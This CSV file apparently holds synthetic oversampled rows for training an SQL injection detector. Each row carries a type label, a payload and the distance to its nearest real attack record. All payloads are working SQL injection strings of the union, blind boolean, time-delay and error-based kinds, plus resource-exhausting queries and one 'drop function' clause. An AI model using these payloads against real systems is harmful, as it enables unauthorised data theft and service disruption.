id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance
SMOTE_000157,attack,boolean,"1""  )   rlike   (  select   (  case when   (  8732  =  6244  )   then 1 else 0x28 end   )    )    and   (  ""unuk""  =  ""unuk",nearest_attack_euclidean,R003981,0.23408512326369765
SMOTE_000158,attack,time,1'+  (  select ukwc where 3008  =  3008 or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #,nearest_attack_euclidean,R003933,0.2650160415893734
SMOTE_000159,attack,error,"1%""  )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and   (  ""%""  =  """,nearest_attack_euclidean,R005929,0.1865082483951951
SMOTE_000160,attack,union,-7940'  )   union all select 6024--,nearest_attack_euclidean,R000990,0.0
SMOTE_000161,attack,boolean,"-9854%""   )    )     )   or 6455  =  3652",nearest_attack_euclidean,R003604,0.19382966351118294
SMOTE_000162,attack,boolean,-5830'  )   as fivy where 2173  =  2173 or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )  --,nearest_attack_euclidean,R003753,0.15699246298614944
SMOTE_000163,attack,error,"-1639   )    )    or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (   3318  =  3318",nearest_attack_euclidean,R005676,0.126049612295602
SMOTE_000164,attack,other,"iif  (  1157  =  4542,1,1/0  )  ",nearest_attack_euclidean,R001306,0.031069634440120515
SMOTE_000165,attack,boolean,-6865  )   or   (  8459  =  8459  )  *4906 and   (  6107  =  6107,nearest_attack_euclidean,R000827,0.2855106676499819
SMOTE_000166,attack,other,select   (  case when   (  5203  =  6330  )   then 5203 else 5203*  (  select 5203 from mysql.db  )   end  )  #,nearest_attack_euclidean,R004194,0.002800099997327154
SMOTE_000167,attack,union,"-5097'  )   union all select 8992,8992,8992,8992,8992,8992,8992,8992,8992--",nearest_attack_euclidean,R002979,0.00545648656453187
SMOTE_000168,attack,union,"1'   )    )    union all select null,null,null,null,null,null,null,null#",nearest_attack_euclidean,R008752,0.042006323049037425
SMOTE_000169,attack,union,"-3794'  )   union all select 2485,2485,2485,2485,2485--",nearest_attack_euclidean,R000679,0.010519059000326457
SMOTE_000170,attack,error,"1   )    )    as gcvw where 7363  =  7363 or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )  --",nearest_attack_euclidean,R003014,0.5914640743075087
SMOTE_000171,attack,boolean,"1'   )    )    or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000784,0.07062636004570483
SMOTE_000172,attack,boolean,"1%""   )    )     )   and elt  (  4249  =  4249,7259  )   and    (    (     (  ""%""  =  """,nearest_attack_euclidean,R007128,0.26541631839782115
SMOTE_000173,attack,error,"1' procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )  ",nearest_attack_euclidean,R006219,0.43842388459688375
SMOTE_000174,attack,other,"iif  (  2452  =  8999,1,1/0  )  ",nearest_attack_euclidean,R001074,0.0002772387274204343
SMOTE_000175,attack,boolean,"-6636'   )    )     )   or elt  (  1032  =  1032,3623  )   and    (    (     (  'kgip'  =  'kgip",nearest_attack_euclidean,R004991,0.0020267140629867154
SMOTE_000176,attack,other,"1"" where 9230  =  9230",nearest_attack_euclidean,R001494,0.0
SMOTE_000177,attack,other,1'   )    )    as nhkp where 8030  =  8030,nearest_attack_euclidean,R001806,8.429369702178807e-08
SMOTE_000178,attack,union,"1   )    )     )   union all select null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R006929,0.06964014816139488
SMOTE_000179,attack,union,"1%"" union all select null,null,null#",nearest_attack_euclidean,R006948,0.4737278893017622
SMOTE_000180,attack,union,"-3368'   )    )    union all select 4913,4913,4913,4913,4913,4913,4913,4913,4913--",nearest_attack_euclidean,R008471,0.008860706621049106
SMOTE_000181,attack,boolean,"-2722""  )   or 4907  =  8126#",nearest_attack_euclidean,R003630,0.021919309218496556
SMOTE_000182,attack,boolean,"1'||  (  select 'xyrk' from dual where 9844  =  9844 and 9254  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R005733,0.6112546702068513
SMOTE_000183,attack,union,"-1526""  )   where 4870  =  4870 union all select 4870,4870,4870,4870,4870,4870,4870,4870,4870,4870#",nearest_attack_euclidean,R008112,0.05537523559110149
SMOTE_000184,attack,union,"1'||  (  select 'xjcg' from dual where 5815  =  5815 union all select null,null,null#",nearest_attack_euclidean,R003429,0.3599513758949943
SMOTE_000185,attack,other,if  (  4135  =  2165  )   select 4135 else drop function otyy--,nearest_attack_euclidean,R004171,0.007184852602756195
SMOTE_000186,attack,time,select pg_sleep  (  5  )   and   (  'aydg'  =  'aydg,nearest_attack_euclidean,R001576,0.13585614436287816
SMOTE_000187,attack,other,1 where 1015  =  1015,nearest_attack_euclidean,R003105,0.021299843710726737
SMOTE_000188,attack,boolean,"1"" and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and ""wtkx""  =  ""wtkx",nearest_attack_euclidean,R001626,0.03601483665915562
SMOTE_000189,attack,other,"iif  (  2869  =  9448,1,1/0  )  ",nearest_attack_euclidean,R003464,0.008710859631758447
SMOTE_000190,attack,boolean,"1'   )    )    and 9254  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R008388,0.09207114043265749
SMOTE_000191,attack,union,"-5300' union all select 2750,2750,2750,2750,2750,2750--",nearest_attack_euclidean,R002846,0.031309268923292784
SMOTE_000192,attack,union,"-4772   )    )     )   union all select 3879,3879,3879,3879,3879--",nearest_attack_euclidean,R002073,0.01057061686459867
SMOTE_000193,attack,boolean,"1   )    )    or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (   5888  =  5888",nearest_attack_euclidean,R008073,0.9024463778617854
SMOTE_000194,attack,error,"-5520""   )    )    as utqk where 7762  =  7762 or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  --",nearest_attack_euclidean,R006751,0.11320902183814882
SMOTE_000195,attack,error,"  (  updatexml  (  8862,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  8862  =  8862,1   )    )     )  ,0x717a767a71  )  ,8981   )    )   ",nearest_attack_euclidean,R007074,0.7570570805200764
SMOTE_000196,attack,time,1' and sleep  (  5  ) ,nearest_attack_euclidean,R002468,0.26668299116304195
SMOTE_000197,attack,boolean,"1'   )    )     )   or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and    (    (     (  'zglq'  =  'zglq",nearest_attack_euclidean,R006169,0.04119419507932953
SMOTE_000198,attack,union,-8143  )   union all select 3014--,nearest_attack_euclidean,R001521,0.06941338778833026
SMOTE_000199,attack,error,"1"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )   ",nearest_attack_euclidean,R007208,0.07951281962696626
SMOTE_000200,attack,boolean,"1%""   )    )    or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )   and    (    (   ""%""  =  """,nearest_attack_euclidean,R006522,0.329557402601456
SMOTE_000201,attack,union,"-9256""   )    )    union all select 2977,2977,2977,2977,2977,2977,2977--",nearest_attack_euclidean,R006966,0.03049812419609453
SMOTE_000202,attack,boolean,-1459'   )    )     )   or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (     (  'eiet' like 'eiet,nearest_attack_euclidean,R008920,0.24248041570656478
SMOTE_000203,attack,error,"1'  )   or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   ",nearest_attack_euclidean,R005090,0.00906262160490001
SMOTE_000204,attack,boolean,"1'  )   or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and   (  'xgzb'  =  'xgzb",nearest_attack_euclidean,R001149,0.04892097628001787
SMOTE_000205,attack,union," select * from users where id  =  '1' or $ .  =  1 union select 1,@@VERSION -- 1'",nearest_attack_euclidean,R000142,0.13469066567885146
SMOTE_000206,attack,boolean,"1'+  (  select 'wkbg' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'",nearest_attack_euclidean,R008283,0.42802592958977037
SMOTE_000207,attack,boolean,"-8819""  )   where 9119  =  9119 or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --",nearest_attack_euclidean,R007675,0.11335403595480023
SMOTE_000208,attack,time,"1""   )    )    and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #",nearest_attack_euclidean,R003047,0.13014323872934833
SMOTE_000209,attack,other,"1""  )   as lvbm where 8179  =  8179",nearest_attack_euclidean,R002903,8.429369702178807e-08
SMOTE_000210,attack,boolean,"-6073""   )    )     )   or 9502  =  2012#",nearest_attack_euclidean,R001525,0.148882074010919
SMOTE_000211,attack,boolean,"1   )    )    and char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",nearest_attack_euclidean,R003696,0.055610888770447266
SMOTE_000212,attack,other,select case when 1574  =  5523 then 1 else null end--,nearest_attack_euclidean,R000772,0.007299857598811774
SMOTE_000213,attack,boolean,"1 or 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --",nearest_attack_euclidean,R008827,0.9632301231568168
SMOTE_000214,attack,union,"-5748' union all select 1224,1224,1224,1224,1224,1224,1224,1224,1224#",nearest_attack_euclidean,R005482,0.04203078548335298
SMOTE_000215,attack,boolean,"1%""  )   or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and   (  ""%""  =  """,nearest_attack_euclidean,R004689,0.224655137371698
SMOTE_000216,attack,time,1'  )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  ) ,nearest_attack_euclidean,R003782,0.026664184878800158
SMOTE_000217,attack,error,"1'   )    )     )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and    (    (     (  'dqjq'  =  'dqjq",nearest_attack_euclidean,R002238,0.1953873916028407
SMOTE_000218,attack,other,1'||  (  select 'gbyh' from dual where 5889  =  5889 order by 1#,nearest_attack_euclidean,R005511,0.4898210036218078
SMOTE_000219,attack,boolean,"1%' or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and '%'  =  '",nearest_attack_euclidean,R002393,0.04880399294493456
SMOTE_000220,attack,boolean,"1  )   and 9254  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R008027,0.3417859516083537
SMOTE_000221,attack,union,"1""   )    )    union all select null,null,null,null,null--",nearest_attack_euclidean,R007835,0.1329544218930074
SMOTE_000222,attack,boolean,-9217 or 9323  =  9323#,nearest_attack_euclidean,R003492,0.03338649629282124
SMOTE_000223,attack,time,1'   )    )    or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #,nearest_attack_euclidean,R004027,0.11890106541695329
SMOTE_000224,attack,boolean,"1  )   as ahfj where 4776  =  4776 or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R008200,0.01014296774754725
SMOTE_000225,attack,error,"1""   )    )     )   procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and    (    (     (  ""tabq"" like ""tabq",nearest_attack_euclidean,R001320,0.20761082106262557
SMOTE_000226,attack,time,1  )   as bpap where 7758  =  7758 or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R007564,0.08186494044448196
SMOTE_000227,attack,boolean,"1%'   )    )    and 9254  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R006300,0.09403559529924183
SMOTE_000228,attack,time,1'+  (  select 'qxmo' where 9511  =  9511 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,nearest_attack_euclidean,R008686,0.44343856645113894
SMOTE_000229,attack,other,"1'+  (  select bptu where 7356  =  7356   (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )      )    )   +'",nearest_attack_euclidean,R006743,1.1286637010247627
SMOTE_000230,attack,other,1   )    )    as zoso where 3633  =  3633,nearest_attack_euclidean,R003508,0.005518308575981307
SMOTE_000231,attack,other,"1""   )    )    as irrz where 8730  =  8730 order by 1#",nearest_attack_euclidean,R004807,0.11512592026940348
SMOTE_000232,attack,boolean,1'+  (  select 'wpnm' where 8223  =  8223 and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'   )    )   +',nearest_attack_euclidean,R005311,0.09499960570365366
SMOTE_000233,attack,boolean,"1'  )   or 5356  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",nearest_attack_euclidean,R004485,0.19082722194613733
SMOTE_000234,attack,boolean,"1"" and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  ",nearest_attack_euclidean,R002254,0.5461672328354744
SMOTE_000235,attack,error,"1'  )   as dajk where 1452  =  1452 procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #",nearest_attack_euclidean,R005645,0.5804499480587471
SMOTE_000236,attack,time,1' where 7828  =  7828 or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R003701,0.08629171027744144
SMOTE_000237,attack,time,1'   )    )    or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and    (    (   'zjun'  =  'zjun,nearest_attack_euclidean,R006292,0.0
SMOTE_000238,attack,other,-4761 order by 1--,nearest_attack_euclidean,R002646,0.6784022362464163
SMOTE_000239,attack,boolean,"1%""   )    )     )   and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R007404,0.39829874310044017
SMOTE_000240,attack,time,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and   (  'dvpw'  =  'dvpw",nearest_attack_euclidean,R005822,0.2786409353167122
SMOTE_000241,attack,error,"1'   )    )    as sxpk where 5524  =  5524 and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )  --",nearest_attack_euclidean,R004925,0.592646040045429
